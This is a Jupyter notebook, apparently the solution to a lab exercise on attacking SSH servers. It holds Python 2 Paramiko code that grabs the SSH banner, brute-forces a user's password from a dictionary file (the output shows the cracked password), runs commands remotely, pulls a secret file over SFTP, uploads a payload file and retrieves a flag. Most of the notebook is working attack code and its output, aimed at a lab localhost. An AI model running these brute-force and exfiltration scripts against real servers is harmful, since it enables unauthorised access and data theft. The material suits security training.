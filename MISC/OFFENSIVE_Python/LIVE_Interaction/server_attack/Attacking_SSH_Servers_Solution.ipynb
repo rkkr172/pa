{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attacking SSH Servers Solution"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "SSH service is running on **port 22** of the **localhost** for user **ssh_user**. Also, a password dictionary \"password_dictionary.txt\" is present in the current working directory. Write code snippets to perform the given tasks.\n",
    "\n",
    "**Paramiko** is installed on the machine for both Python2.x and Python3.y\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### SSH"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 1:**  Check if SSH service is running? Also grab the SSH banner, security setting and peername if possible."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This SSH service is hosted by AttackDefense.com\n",
      "\n",
      "<paramiko.SecurityOptions for <paramiko.Transport at 0xc42aaa50L (cipher aes128-ctr, 128 bits) (connected; awaiting auth)>>\n",
      "('127.0.0.1', 22)\n",
      "<class 'paramiko.ssh_exception.AuthenticationException'> Authentication failed.\n"
     ]
    }
   ],
   "source": [
    "import sys, paramiko\n",
    "\n",
    "hostname='localhost'\n",
    "port=22\n",
    "username='ssh_user'\n",
    "password=''\n",
    "\n",
    "try:\n",
    "    client = paramiko.SSHClient()\n",
    "    client.load_system_host_keys()\n",
    "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    client.connect(hostname, port=port, username=username, password=password)\n",
    "    print(stdout.read())\n",
    "\n",
    "except Exception, e:\n",
    "    # Printing banner\n",
    "    print client._transport.get_banner()\n",
    "    # Printing security options\n",
    "    print client._transport.get_security_options()\n",
    "    # Printing peer info\n",
    "    print client._transport.getpeername()\n",
    "    # Exception\n",
    "    print sys.exc_info()[0], str(e)\n",
    "    \n",
    "finally:\n",
    "    client.close()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 2:**  Perform the dictionary attack to recover the password for user \"ssh_user\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying with password:  123456\n",
      "Trying with password:  12345\n",
      "Trying with password:  1234\n",
      "Trying with password:  1234567\n",
      "Trying with password:  dragon\n",
      "Trying with password:  baseball\n",
      "Trying with password:  abc123\n",
      "Trying with password:  letmein\n",
      "Trying with password:  696969\n",
      "Trying with password:  shadow\n",
      "Trying with password:  michael\n",
      "Trying with password:  654321\n",
      "Trying with password:  superman\n",
      "Trying with password:  1qaz2wsx\n",
      "Trying with password:  7777777\n",
      "Trying with password:  121212\n",
      "Trying with password:  000000\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "No handlers could be found for logger \"paramiko.transport\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying with password:  qazwsx\n",
      "Trying with password:  123qwe\n",
      "Trying with password:  killer\n",
      "Trying with password:  trustno1\n",
      "Trying with password:  jordan\n",
      "Trying with password:  jennifer\n",
      "Trying with password:  zxcvbnm\n",
      "Trying with password:  asdfgh\n",
      "Trying with password:  hunter\n",
      "Trying with password:  buster\n",
      "Trying with password:  soccer\n",
      "Trying with password:  harley\n",
      "Trying with password:  batman\n",
      "Trying with password:  andrew\n",
      "Trying with password:  tigger\n",
      "Trying with password:  sunshine\n",
      "Trying with password:  iloveyou\n",
      "Trying with password:  2000\n",
      "Trying with password:  charlie\n",
      "Trying with password:  robert\n",
      "Trying with password:  thomas\n",
      "Trying with password:  hockey\n",
      "Trying with password:  ranger\n",
      "Trying with password:  daniel\n",
      "Trying with password:  starwars\n",
      "Trying with password:  klaster\n",
      "Trying with password:  112233\n",
      "Trying with password:  george\n",
      "Trying with password:  computer\n",
      "Trying with password:  maggie\n",
      "Trying with password:  159753\n",
      "Trying with password:  aaaaaa\n",
      "Trying with password:  ginger\n",
      "Trying with password:  princess\n",
      "Trying with password:  joshua\n",
      "Trying with password:  cheese\n",
      "Trying with password:  amanda\n",
      "Trying with password:  summer\n",
      "Trying with password:  love\n",
      "Trying with password:  ashley\n",
      "Trying with password:  6969\n",
      "Trying with password:  nicole\n",
      "Trying with password:  chelsea\n",
      "Trying with password:  matthew\n",
      "Trying with password:  access\n",
      "Trying with password:  diamond\n",
      "Trying with password:  1234qwer\n",
      "Trying with password:  gfhjkm\n",
      "Trying with password:  silver\n",
      "Trying with password:  222222\n",
      "Trying with password:  88888888\n",
      "Trying with password:  anthony\n",
      "Trying with password:  justin\n",
      "Trying with password:  bailey\n",
      "Trying with password:  q1w2e3r4t5\n",
      "Trying with password:  internet\n",
      "Trying with password:  scooter\n",
      "Trying with password:  golfer\n",
      "Trying with password:  cookie\n",
      "Trying with password:  phoenix\n",
      "Trying with password:  camaro\n",
      "Trying with password:  sexy\n",
      "Trying with password:  welcome@234\n",
      "Login successful with password:  welcome@234\n"
     ]
    }
   ],
   "source": [
    "import sys, paramiko\n",
    "\n",
    "hostname='localhost'\n",
    "port=22\n",
    "username='ssh_user'\n",
    "password_dict=\"password_dictionary.txt\"\n",
    "\n",
    "client = paramiko.SSHClient()\n",
    "client.load_system_host_keys()\n",
    "client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "\n",
    "# Loading the password dictionary and Striping \\n\n",
    "lines = [line.rstrip('\\n') for line in open(password_dict)]\n",
    "\n",
    "# Iterating over dictionary\n",
    "for password in lines:\n",
    "    print \"Trying with password: \",password\n",
    "    try:\n",
    "        client.connect(hostname, port=port, username=username, password=password)\n",
    "        print \"Login successful with password: \",password\n",
    "        break\n",
    "    except:\n",
    "        #print(sys.exc_info()[0])\n",
    "        continue\n",
    "        \n",
    "client.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 3:**  Check the running processes on the machine using SSH connection."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "UID        PID  PPID  C STIME TTY          TIME CMD\n",
      "pentest+     1     0  0 07:03 pts/0    00:00:00 tini -g -- /startup.sh\n",
      "pentest+     8     1  0 07:03 pts/0    00:00:00 /bin/bash /startup.sh\n",
      "root        25     1  0 07:03 ?        00:00:00 /usr/sbin/sshd\n",
      "pentest+    27     8  0 07:03 pts/0    00:00:02 /opt/conda/bin/python /opt/conda/bin/jupyter-notebook\n",
      "pentest+    43    27  0 07:06 ?        00:00:08 /usr/bin/python2 -m ipykernel_launcher -f /home/pentester/.local/share/jupyter/runtime/kernel-30dc002e-b041-4a09-915a-0e9f2084e56a.json\n",
      "pentest+    59    27  0 07:07 pts/1    00:00:00 /bin/bash\n",
      "root       359    25  0 07:33 ?        00:00:00 sshd: ssh_user [priv]\n",
      "ssh_user   372   359  0 07:33 ?        00:00:00 sshd: ssh_user@notty\n",
      "ssh_user   373   372  0 07:33 ?        00:00:00 sh -c ps -ef\n",
      "ssh_user   374   373  0 07:33 ?        00:00:00 ps -ef\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import sys, paramiko\n",
    "\n",
    "hostname='localhost'\n",
    "port=22\n",
    "username='ssh_user'\n",
    "password='welcome@234'\n",
    "\n",
    "try:\n",
    "    client = paramiko.SSHClient()\n",
    "    client.load_system_host_keys()\n",
    "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    client.connect(hostname, port=port, username=username, password=password)\n",
    "    # Running command on successful login \n",
    "    stdin, stdout, stderr = client.exec_command(\"ps -ef\")\n",
    "    print(stdout.read())\n",
    "\n",
    "except Exception, e:\n",
    "    print(sys.exc_info()[0], str(e))\n",
    "    \n",
    "finally:\n",
    "    client.close()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### SFTP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 4:**  Get file secret.txt from home directory of user \"ssh_user\" using SSH connection?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys, paramiko\n",
    "\n",
    "hostname='localhost'\n",
    "port=22\n",
    "username='ssh_user'\n",
    "password='welcome@234'\n",
    "\n",
    "try:\n",
    "    client = paramiko.SSHClient()\n",
    "    client.load_system_host_keys()\n",
    "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    client.connect(hostname, port=port, username=username, password=password)\n",
    "    # Copying file from remote machine \n",
    "    sftp_client = client.open_sftp()\n",
    "    sftp_client.get('/home/ssh_user/secret.txt','/home/pentester/secret.txt')\n",
    "    sftp_client.close()\n",
    "except Exception, e:\n",
    "    print(sys.exc_info()[0], str(e))\n",
    "    \n",
    "finally:\n",
    "    client.close()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 5:** Put payload.bin file from present working directory to home directory of user \"ssh_user\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys, paramiko\n",
    "\n",
    "hostname='localhost'\n",
    "port=22\n",
    "username='ssh_user'\n",
    "password='welcome@234'\n",
    "\n",
    "try:\n",
    "    client = paramiko.SSHClient()\n",
    "    client.load_system_host_keys()\n",
    "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    client.connect(hostname, port=port, username=username, password=password)\n",
    "    # Copying file from remote machine \n",
    "    sftp_client = client.open_sftp()\n",
    "    sftp_client.put('payload.bin','/home/ssh_user/payload.bin')\n",
    "    sftp_client.close()\n",
    "except Exception, e:\n",
    "    print(sys.exc_info()[0], str(e))\n",
    "    \n",
    "finally:\n",
    "    client.close()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 6:**  Verify that the sample.txt file is copied to home directory of user \"ssh_user\". "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 8\n",
      "-rw-r--r-- 1 ssh_user 1001 49 Sep 20 08:22 payload.bin\n",
      "-rw-r--r-- 1 root     root 41 Sep 20 06:29 secret.txt\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import sys, paramiko\n",
    "\n",
    "hostname='localhost'\n",
    "port=22\n",
    "username='ssh_user'\n",
    "password='welcome@234'\n",
    "\n",
    "try:\n",
    "    client = paramiko.SSHClient()\n",
    "    client.load_system_host_keys()\n",
    "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    client.connect(hostname, port=port, username=username, password=password)\n",
    "    # Running command on successful login \n",
    "    stdin, stdout, stderr = client.exec_command(\"ls -l /home/ssh_user/\")\n",
    "    print(stdout.read())\n",
    "\n",
    "except Exception, e:\n",
    "    print(sys.exc_info()[0], str(e))\n",
    "    \n",
    "finally:\n",
    "    client.close()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Flag Hunting"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task:** Search and retrive text flag from a file named flag.  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/flag\n",
      "\n",
      "flag: d1c456abcc09848\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import sys, paramiko\n",
    "\n",
    "hostname='localhost'\n",
    "port=22\n",
    "username='ssh_user'\n",
    "password='welcome@234'\n",
    "\n",
    "try:\n",
    "    client = paramiko.SSHClient()\n",
    "    client.load_system_host_keys()\n",
    "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    client.connect(hostname, port=port, username=username, password=password)\n",
    "    # Running command on successful login \n",
    "    stdin, stdout, stderr = client.exec_command(\"find / -name flag\")\n",
    "    output=stdout.read()\n",
    "    print output\n",
    "    cmd=\"cat \"+output\n",
    "    stdin, stdout, stderr = client.exec_command(cmd)\n",
    "    print(stdout.read())\n",
    "\n",
    "except Exception, e:\n",
    "    print(sys.exc_info()[0], str(e))\n",
    "    \n",
    "finally:\n",
    "    client.close()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15rc1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
